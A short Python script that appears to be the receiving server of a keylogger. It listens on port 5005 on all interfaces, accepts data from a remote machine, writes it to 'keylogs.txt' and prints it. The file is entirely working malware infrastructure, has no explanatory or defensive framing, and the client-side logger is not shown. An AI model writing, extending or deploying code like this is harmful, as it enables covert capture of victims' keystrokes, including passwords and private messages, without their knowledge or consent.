import socket
import os

host = "0.0.0.0"
port = 5005

objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
objSocket.bind((host, port))
objSocket.listen(socket.SOMAXCONN)

while (True):
    try:
        conn, address = objSocket.accept()

        bufferSize = int(conn.recv(1024))
        fileData = str(conn.recv(bufferSize), "utf-8")

        with open("keylogs.txt", "w") as LogFile:
            LogFile.write(fileData)

        conn.close(); del(conn)

        os.system("clear" if os.name == "posix" else "cls")
        print(fileData)

    except socket.error:
        print(f"[!] Failed to Connect to Remote Machine ~ {address[0]}\nAttempting to Reconnect...")
    
    finally: continue